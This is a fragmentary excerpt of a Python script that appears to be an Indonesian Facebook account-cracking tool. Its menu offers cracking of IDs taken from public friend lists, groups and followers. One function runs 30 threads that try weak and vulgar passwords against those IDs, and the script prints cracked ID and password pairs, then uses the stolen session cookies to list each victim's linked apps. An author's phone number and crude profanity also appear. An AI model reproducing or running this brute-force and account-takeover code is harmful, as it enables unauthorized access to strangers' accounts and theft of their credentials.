...
\x1b[1;97m·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀     ▀▀  █▪▀▀▀·▀▀▀▀ ▀▀▀ 
╔═════════════════════╗
║ \x1b[1;97mCode : By Prastt \x1b[1;92m   ║
║\x1b[1;97m® MR.Saya Fanzyy ®    ║
╚═════════════════════╝""")
clear()
...
def menu():
	...
	io = '\x1b[1;92m[01] \33[1;96mCrack Dari Pertemanan Publik\n\x1b[1;92m[02] \33[1;96mCrack ID Dari Akun Publik (masal) \n\x1b[1;92m[03] \33[1;96mCrack Dari Grup\n\x1b[1;92m[04] \33[1;96mBot Share Fb\n\x1b[1;92m[05] \33[1;96mCrack Follower Fb\n\x1b[1;92m[06] \33[1;96mCek Hasil Crack\n\x1b[1;92m[07] Gantin User Agent\n\033\x1b[1;92m[08] Cek Hasil Crack\n[00] Keluar'
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayang','anjing','katasandi','kontol123','memek123','indonesia']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s Rezzy %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\x1b[1;92m[ok Rezzy] \33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					cek_apk(kuki)
					break
...
{B} |
{P}[•] AUTHOR : REZZY XD
{P}[•] WHATSAPP : 083116821680
{B}[•] FACEBOOK : Saya Fanzzyy""")
def licensi():#line:42
  try :#line:43
    os .system ('clear')
    kontol()
...
def cek_apk(kukis):
	...
	try:
		for i in range(len(game)):
			print ("\r%s|___ Aktif [\x1b[1;92m%s\x1b[1;97m]. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	...
	try:
		for i in range(len(game)):
			print ("\r    %s|__ Non-aktif [\x1b[1;95m%s\x1b[1;97m]. %s%s"%(P,i+1,Q,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s|__ Cookie invalid"%(M))
